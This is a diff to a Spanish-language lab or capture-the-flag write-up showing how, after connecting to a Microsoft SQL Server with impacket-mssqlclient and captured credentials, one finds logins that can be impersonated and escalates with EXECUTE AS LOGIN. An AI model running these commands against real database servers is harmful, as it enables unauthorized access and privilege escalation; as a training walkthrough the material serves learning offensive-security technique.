@@ -26,3 +26,10 @@ Con la cuenta creada vemos varios campos donde podemos introducir algún tipo de
 Nos conectamos a la base de datos usando impacket-mssqlclient con el siguiente comando y las credenciales obtenidas `impacket-mssqlclient kevin@10.129.12.215 -p 1433`
 Para ver las bases de datos usamos `select name from sys.databases;`
 Con el comando `use` podemos seleccionar la base de datos que queremos ver
+
+Vamos a buscar un usuario al que se pueda impersonar
+`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';`
+
+Impersonamos al usuario con `EXECUTE AS LOGIN ='appdev';`
+
+Enumeramos las bases de daros `SELECT name FROM sys.databases;`
